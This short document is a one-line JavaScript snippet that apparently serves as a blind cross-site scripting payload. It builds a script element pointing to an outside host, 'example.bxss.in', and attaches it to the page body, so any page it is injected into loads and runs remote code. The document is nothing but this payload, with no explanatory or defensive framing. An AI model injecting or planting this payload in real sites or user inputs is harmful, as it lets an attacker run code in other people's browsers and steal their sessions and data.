(function() { if (typeof window !== 'undefined') { const script = document.createElement('script'); script.src='https://example.bxss.in'; document.body.appendChild(script); } })();
